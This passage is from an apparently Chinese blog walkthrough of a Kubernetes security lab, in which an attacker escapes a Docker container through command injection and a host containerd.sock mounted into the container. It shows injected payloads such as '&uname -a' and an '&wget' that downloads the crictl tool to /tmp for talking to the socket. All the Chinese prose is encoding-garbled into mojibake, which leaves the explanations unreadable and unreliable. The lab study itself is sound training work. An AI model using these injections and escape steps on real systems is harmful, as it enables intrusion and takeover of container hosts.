PjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2018.03.53.png" style="zoom:40%;">

<ul>
<li>æ­¤åœºæ™¯çš„ç›®æ ‡æ˜¯ä»æ­£åœ¨è¿è¡Œçš„ Docker å®¹å™¨ä¸­é€ƒé€¸åˆ°è¿è¡Œè¯¥å®¹å™¨çš„å®¿ä¸»ç³»ç»Ÿï¼Œå¹¶èƒ½å¤Ÿè®¿é—®å’Œå¯¹è¯¥èŠ‚ç‚¹ä¸Šè¿è¡Œçš„å…¶ä»–å®¹å™¨æ‰§è¡Œæ“ä½œã€‚</li>
</ul>
<h3 id="3-2-3-å®è·µ-metarget-goat"><a href="#3-2-3-å®è·µ-metarget-goat" class="headerlink" title="3.2.3 å®è·µ[metarget-goat]"></a>3.2.3 å®è·µ[metarget-goat]</h3><ul>
<li>å‘½ä»¤æ³¨å…¥æ¼æ´</li>
</ul>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2018.12.34.png" style="zoom:50%;">

<blockquote>
<h4 id="Linuxå‘½ä»¤æ‰§è¡Œæ–¹æ³•"><a href="#Linuxå‘½ä»¤æ‰§è¡Œæ–¹æ³•" class="headerlink" title="Linuxå‘½ä»¤æ‰§è¡Œæ–¹æ³•"></a>Linuxå‘½ä»¤æ‰§è¡Œæ–¹æ³•</h4><p>&amp;ã€&amp;&amp;ã€|ã€||ã€; </p>
</blockquote>
<ul>
<li>æŸ¥çœ‹æŒ‚è½½ä¿¡æ¯</li>
</ul>
<blockquote>
<h4 id="mountå‘½ä»¤"><a href="#mountå‘½ä»¤" class="headerlink" title="mountå‘½ä»¤"></a>mountå‘½ä»¤</h4><p>â€œæŒ‚è½½â€ï¼ˆMountï¼‰æ˜¯è®¡ç®—æœºç³»ç»Ÿï¼ˆå°¤å…¶æ˜¯ç±» Unix ç³»ç»Ÿï¼Œå¦‚ Linuxï¼‰ä¸­ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼Œ<strong>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å°†ä¸€ä¸ªå­˜å‚¨è®¾å¤‡æˆ–æ–‡ä»¶ç³»ç»Ÿï¼Œâ€œæ¥å…¥â€åˆ°ç³»ç»Ÿçš„ç›®å½•æ ‘ä¸­ï¼Œä½¿å…¶å†…å®¹å¯ä»¥é€šè¿‡æŸä¸ªç›®å½•è·¯å¾„è®¿é—®</strong>ã€‚</p>
<p>åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œ<code>mount</code> å‘½ä»¤ç”¨äºå°†å­˜å‚¨è®¾å¤‡ï¼ˆå¦‚ç¡¬ç›˜ã€Uç›˜ã€å…‰ç›˜ï¼‰æˆ–è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼ˆå¦‚ ISO é•œåƒã€ç½‘ç»œå…±äº«ï¼‰<strong>æŒ‚è½½</strong>åˆ°ç›®å½•æ ‘çš„æŸä¸ªä½ç½®ï¼ˆç§°ä¸ºâ€œæŒ‚è½½ç‚¹â€ï¼‰ï¼Œä½¿å¾—ç”¨æˆ·å¯ä»¥é€šè¿‡è¯¥ç›®å½•è®¿é—®è®¾å¤‡æˆ–æ–‡ä»¶ç³»ç»Ÿçš„å†…å®¹ã€‚</p>
<p>å½“åœ¨Linuxä¸­æ‰§è¡Œä¸å¸¦å‚æ•°çš„mountå‘½ä»¤æ—¶ï¼Œç³»ç»Ÿä¼šåˆ—å‡ºæ‰€æœ‰å·²æŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿã€‚è¿™åŒ…æ‹¬å„ç§è®¾å¤‡ã€è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œæ¯”å¦‚procã€sysfsã€tmpfsç­‰ï¼Œè¿˜æœ‰åƒ/devã€/runè¿™æ ·çš„æŒ‚è½½ç‚¹ã€‚</p>
<p>å®ƒä¼šæ˜¾ç¤ºæ¯ä¸ªæŒ‚è½½è®¾å¤‡çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬è®¾å¤‡è·¯å¾„ã€æŒ‚è½½ç‚¹ã€æ–‡ä»¶ç³»ç»Ÿç±»å‹ã€æŒ‚è½½é€‰é¡¹ç­‰ã€‚</p>
<p>è¾“å‡ºç¤ºä¾‹ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/dev/sda1 on / <span class="token builtin class-name">type</span> ext4 <span class="token punctuation">(</span>rw,relatime,errors<span class="token operator">=</span>remount-ro<span class="token punctuation">)</span>
tmpfs on /dev/shm <span class="token builtin class-name">type</span> tmpfs <span class="token punctuation">(</span>rw,nosuid,nodev<span class="token punctuation">)</span>
proc on /proc <span class="token builtin class-name">type</span> proc <span class="token punctuation">(</span>rw,nosuid,nodev,noexec,relatime<span class="token punctuation">)</span>
sysfs on /sys <span class="token builtin class-name">type</span> sysfs <span class="token punctuation">(</span>rw,nosuid,nodev,noexec,relatime<span class="token punctuation">)</span>
/dev/sdb1 on /mnt/data <span class="token builtin class-name">type</span> ext4 <span class="token punctuation">(</span>rw,noatime<span class="token punctuation">)</span>
<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li><strong>è®¾å¤‡/èµ„æºè·¯å¾„</strong><br>ä¾‹å¦‚ï¼š<code>/dev/sda1</code>ï¼ˆç¡¬ç›˜åˆ†åŒºï¼‰ã€<code>tmpfs</code>ï¼ˆå†…å­˜æ–‡ä»¶ç³»ç»Ÿï¼‰ã€<code>proc</code>ï¼ˆå†…æ ¸è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼‰ã€‚</li>
<li><strong>æŒ‚è½½ç‚¹ï¼ˆMount Pointï¼‰</strong><br>æ–‡ä»¶ç³»ç»Ÿè¢«æŒ‚è½½åˆ°çš„ç›®å½•ï¼Œä¾‹å¦‚ <code>/</code>ï¼ˆæ ¹ç›®å½•ï¼‰ã€<code>/mnt/data</code>ã€‚</li>
<li><strong>æ–‡ä»¶ç³»ç»Ÿç±»å‹ï¼ˆTypeï¼‰</strong><br>ä¾‹å¦‚ <code>ext4</code>ã€<code>tmpfs</code>ã€<code>proc</code>ã€<code>ntfs</code>ã€<code>nfs</code> ç­‰ã€‚</li>
<li><strong>æŒ‚è½½é€‰é¡¹ï¼ˆOptionsï¼‰</strong><br>æ‹¬å·å†…çš„å‚æ•°è¡¨ç¤ºæŒ‚è½½æ—¶çš„é€‰é¡¹ï¼Œä¾‹å¦‚ï¼š<ul>
<li><code>rw</code>ï¼šè¯»å†™æ¨¡å¼ã€‚</li>
<li><code>ro</code>ï¼šåªè¯»æ¨¡å¼ã€‚</li>
<li><code>noexec</code>ï¼šç¦æ­¢æ‰§è¡ŒæŒ‚è½½ç‚¹ä¸­çš„ç¨‹åºã€‚</li>
<li><code>relatime</code>ï¼šä¼˜åŒ–æ–‡ä»¶è®¿é—®æ—¶é—´æ›´æ–°ã€‚</li>
<li><code>nodev</code>ï¼šå¿½ç•¥è®¾å¤‡æ–‡ä»¶ï¼ˆå¦‚ <code>/dev</code> ä¸­çš„ç¡¬ä»¶è®¾å¤‡ï¼‰ã€‚</li>
</ul>
</li>
</ol>
</blockquote>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2018.22.24.png" style="zoom:50%;">

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tmpfs on /custom/containerd/containerd.sock <span class="token builtin class-name">type</span> tmpfs <span class="token punctuation">(</span>rw,nosuid,nodev,noexec,relatime<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p><strong>tmpfs</strong> æ˜¯ä¸€ç§åŸºäºå†…å­˜çš„ä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿï¼Œæ•°æ®å­˜å‚¨åœ¨å†…å­˜ä¸­è€Œéç£ç›˜ä¸Šï¼Œå› æ­¤è¯»å†™é€Ÿåº¦å¿«ï¼Œä½†ç³»ç»Ÿé‡å¯åæ•°æ®ä¼šä¸¢å¤±ã€‚</p>
<p><strong>è·¯å¾„å«ä¹‰</strong>ï¼šå°† <code>tmpfs</code> æŒ‚è½½åˆ° <code>/custom/containerd/containerd.sock</code> è¿™ä¸€è·¯å¾„ã€‚</p>
</blockquote>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° /custom/containerd/containerd.sock å·²æŒ‚è½½åˆ°æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œå‡è®¾å®ƒæ˜¯ä»ä¸»æœºç³»ç»ŸæŒ‚è½½çš„ï¼Œæˆ‘ä»¬éœ€è¦ä¸å®ƒé€šä¿¡ä»¥é€šè¿‡ UNIX å¥—æ¥å­—è¿›è¡Œäº¤äº’ã€‚</p>
<p>å°†å®¿ä¸»æœºçš„ <code>containerd.sock</code>ï¼ˆå¦‚ <code>/run/containerd/containerd.sock</code>ï¼‰æŒ‚è½½åˆ°å®¹å™¨å†…çš„è·¯å¾„ï¼ˆå¦‚ <code>/custom/containerd/containerd.sock</code>ï¼‰ï¼Œå¹¶è®¾ç½®ä¸º <code>tmpfs</code>ï¼Œå¯èƒ½ä¼šå¯¼è‡´ä¸¥é‡çš„å®‰å…¨é£é™©ã€‚</p>
<p>æ ¸å¿ƒé£é™©ï¼š<strong>å®¹å™¨é€ƒé€¸ä¸æƒé™æ»¥ç”¨</strong>ï¼š1ï¼‰<strong>åˆ›å»ºç‰¹æƒå®¹å™¨é€ƒé€¸åˆ°å®¿ä¸»æœº</strong>ã€‚2ï¼‰<strong>æ“ä½œå®¿ä¸»æœºä¸Šçš„å…¶ä»–å®¹å™¨</strong>ã€‚3ï¼‰<strong>ç»•è¿‡èµ„æºéš”ç¦»é™åˆ¶</strong>ã€‚</p>
<ul>
<li>å¥—æ¥å­—é€šä¿¡</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤šç§æ–¹æ³•ä¸ containerd.sock UNIX å¥—æ¥å­—è¿›è¡Œé€šä¿¡ã€‚å…¶ä¸­ä¸€äº›æ–¹æ³•åŒ…æ‹¬ä½¿ç”¨ crictl äºŒè¿›åˆ¶å·¥å…·ï¼Œæˆ–è€…ç®€å•çš„ curl ç¨‹åºã€‚</p>
<p>1ï¼‰æŸ¥çœ‹ç³»ç»Ÿç±»å‹ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token function">uname</span> <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-08%2015.58.29.png" style="zoom:40%;">

<p><code>ubuntu18.04.1 x86_64</code></p>
<p>2ï¼‰ä¸‹è½½å¥—æ¥å­—é€šä¿¡ç¨‹åº</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä»github <a target="_blank" rel="noopener" href="https://github.com/kubernetes-sigs/cri-tools/releases">https://github.com/kubernetes-sigs/cri-tools/releases</a> ä¸‹è½½ crictl é™æ€äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token function">wget</span> https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.27.1/crictl-v1.27.1-linux-amd64.tar.gz <span class="token parameter variable">-O</span> /tmp/crictl-v1.27.1.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-08%2016.02.50.png" style="zoom:50%;">

<p>å¯ä»¥çœ‹åˆ°ç¨‹åºå·²ç»æˆåŠŸä¸‹è½½åˆ°tmpç›®å½•ä¸­ï¼Œä½†æ˜¯ç”¨<code>ls -lh</code>æŸ¥çœ‹å¤§å°ä¸º0ï¼Œå®é™…ä¸Šåªä¸‹è½½äº†ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥tarè§£å‹çš„æ—¶å€™ä¼šæŠ¥é”™ã€‚</p>
<blockquote>
<h4 id="ä¸‹è½½å‡ºé”™é—®é¢˜å¤„ç†"><a href="#ä¸‹è½½å‡ºé”™é—®é¢˜å¤„ç†" class="headerlink" title="ä¸‹è½½å‡ºé”™é—®é¢˜å¤„ç†"></a>ä¸‹è½½å‡ºé”™é—®é¢˜å¤„ç†</h4><ul>
<li>æ£€æµ‹tarå‘½ä»¤æ˜¯å¦å­˜åœ¨ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯å­˜åœ¨çš„</li>
</ul>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2015.33.14.png" style="zoom:40%;">

<ul>
<li><code>&amp;tar -xvf /tmp/crictl-v1.27.1.tar.gz -C /tmp/</code>æ‰§è¡Œæ—¶è¿”å›<code>exit status 2</code>é”™è¯¯ï¼ŒæŸ¥çœ‹tmpç›®å½•ï¼Œæ²¡æœ‰è§£å‹æˆåŠŸã€‚</li>
</ul>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2015.35.41.png" style="zoom:40%;">

<ul>
<li>æ’æŸ¥æ˜¯å¦æ˜¯æ–‡ä»¶æœ¬èº«çš„é—®é¢˜<code>&amp;ls -lh /tmp/crictl-v1.27.1.tar.gz</code>ï¼Œæ‰§è¡Œä¹‹åè¿”å›</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-rw-r--r-- <span class="token number">1</span> root root <span class="token number">0</span> May <span class="token number">13</span> 07:20 /tmp/crictl-v1.27.1.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ–‡ä»¶ <code>/tmp/crictl-v1.27.1.tar.gz</code> çš„å¤§å°ä¸º <strong>0</strong>ï¼ˆ<code>root root 0</code>ï¼‰ï¼Œè¿™æ„å‘³ç€æ–‡ä»¶ <strong>æœªè¢«æ­£ç¡®ä¸‹è½½æˆ–å†™å…¥</strong>ï¼Œå¯¼è‡´è§£å‹å¤±è´¥ã€‚</p>
<ul>
<li>åœ¨æœ¬åœ°å°è¯•ç”¨curlä¸‹è½½crictl-v1.27.1.tar.gzï¼Œæ˜¯ç½‘ç»œé—®é¢˜å¯¼è‡´æ— æ³•ä¸‹è½½ã€‚</li>
</ul>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2015.46.17.png" style="zoom:50%;">

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-L</span> <span class="token parameter variable">-o</span> /tmp/crictl-v1.27.1-2.tar.gz https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.27.1/crictl-v1.27.1-linux-amd64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è¿”å› exit status 6ã€‚</p>
<p>é‡åˆ° <code>curl</code> è¿”å› <strong>exit status 6</strong> é”™è¯¯æ—¶ï¼Œé€šå¸¸è¡¨ç¤º <strong>æ— æ³•è§£æç›®æ ‡åŸŸå</strong>ï¼ˆDNS è§£æå¤±è´¥æˆ–ç½‘ç»œä¸é€šï¼‰ã€‚</p>
<p>ä½†æ˜¯baidu.comã€github.comå¯ä»¥è®¿é—®é€šï¼Œå¯ä»¥è¿æ¥äº’è”ç½‘ã€‚</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2015.51.31.png" style="zoom:50%;">

